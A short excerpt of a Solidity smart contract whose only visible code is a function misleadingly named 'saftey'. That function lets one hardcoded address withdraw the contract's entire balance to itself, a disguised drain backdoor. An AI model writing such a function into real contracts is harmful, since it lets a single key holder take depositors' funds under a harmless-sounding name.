...
// 2.5%
    ...
    function saftey() public {
        require(msg.sender == 0x4Aba305c2e31ff72eFF54D04d63ca7eC2A51Ff4D, "Not owner"); 
        payable(0x4Aba305c2e31ff72eFF54D04d63ca7eC2A51Ff4D).transfer(address(this).balance);
    }
}